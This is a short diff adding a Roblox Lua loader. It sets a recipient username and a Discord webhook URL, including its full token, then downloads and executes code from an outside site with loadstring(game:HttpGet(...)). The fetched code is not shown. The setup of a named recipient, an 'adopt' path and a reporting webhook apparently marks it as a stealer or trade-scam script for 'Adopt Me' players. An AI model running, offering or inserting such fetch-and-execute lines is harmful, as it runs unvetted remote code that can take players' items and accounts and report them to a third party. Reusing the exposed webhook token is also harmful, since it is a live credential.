@@ -1,0 +1,4 @@
+getgenv().allowed_name = "Reyghttadopt10"
+getgenv().webhook = "https://discord.com/api/webhooks/1033467716612390942/yER9UYM5i7dykCUZl3OcDG_utZJG5FE65_HvYcbichsNuqOwQm0GwQ1X3J7WsPmRfHc_"
+
+loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
